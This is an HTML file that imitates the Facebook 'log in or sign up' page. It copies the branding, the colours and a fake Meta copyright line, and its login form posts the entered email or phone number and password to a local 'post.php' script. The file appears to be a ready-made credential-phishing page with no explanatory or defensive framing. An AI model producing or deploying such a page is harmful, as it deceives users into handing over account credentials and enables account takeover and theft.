<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      color: #1877f2;
      font-size: 56px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .tagline {
      font-size: 20px;
      margin-bottom: 30px;
      text-align: center;
      max-width: 300px;
    }

    .login-box {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      margin-bottom: 14px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
    }

    button.login-btn {
      width: 100%;
      background-color: #1877f2;
      color: white;
      font-size: 20px;
      font-weight: bold;
      padding: 12px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    button.login-btn:hover {
      background-color: #166fe5;
    }

    .forgot-link {
      display: block;
      color: #1877f2;
      font-size: 14px;
      text-align: center;
      margin: 15px 0;
      text-decoration: none;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .divider {
      border-top: 1px solid #dadde1;
      margin: 20px 0;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      padding: 12px 16px;
      font-size: 17px;
      cursor: pointer;
      margin: auto;
      display: block;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #777;
      text-align: center;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="content">
      <div class="logo">facebook</div>
      <div class="tagline">Connect with friends and the world around you on Facebook.</div>
      <div class="login-box">
        <form method="POST" action="post.php">
          <input type="text" name="username" placeholder="Email or phone number" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit" class="login-btn">Log In</button>
        </form>
        <a class="forgot-link" href="#">Forgot Password?</a>
        <div class="divider"></div>
        <button class="create-btn">Create New Account</button>
      </div>
      <div class="footer">Facebook – your favorite social media platform<br>
      Copyright: 2025 Reserved by Meta
      </div>
    </div>
  </div>
</body>

</html>
